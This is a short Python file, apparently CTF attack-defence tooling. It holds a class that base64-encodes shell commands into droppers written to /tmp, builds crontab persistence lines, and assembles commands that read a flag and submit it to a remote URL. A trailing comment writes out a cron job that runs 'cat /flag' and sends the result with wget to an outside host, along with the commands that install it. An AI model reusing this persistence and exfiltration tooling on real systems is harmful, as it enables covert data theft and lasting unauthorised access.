import hashlib
import base64
import time
class CmdBuilder:
    def __init__(self):
        pass
    """
    获取标准时间格式
    args:
        targetTime:默认为time.localtime()
    return:
        time.strftime("%Y%m%d_%H%M%S", targetTime)
    """
    @staticmethod
    def StandardTime(targetTime=None):
        if targetTime==None:
            targetTime=time.localtime()
        return time.strftime("%Y%m%d_%H%M%S", targetTime)
    @staticmethod
    def buildCrontab(interval,shcmd):
        raw= f"{interval} * * * * {shcmd}"
        return raw
    @staticmethod
    def buildCmd(rawCmd):
        raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
        md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
        return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/{md5Str}.sh',md5Str
    @staticmethod
    def buildAutoSubmitFlagCmd(tpl,requestinfo):
        method=requestinfo['method']
        action=tpl['method'][method]
        url=tpl['url'].format(
            requestinfo['url'].format(
                requestinfo['token'],
                "\"$f\""),
            f'{requestinfo["payload"]}'
            )
        cmd = f'f=`{requestinfo["flagcmd"]}`;\n{url}'
        print(cmd)
        return cmd

# echo "*/1 * * * * /bin/sh \"f=\`cat /flag\`\nwget \"http://edprin.natappfree.cc?token=serfend&flag=\$f\"\"">>/app/444.sh
# chmod 755 /app/444.sh
# /usr/bin/crontab /app/444.sh

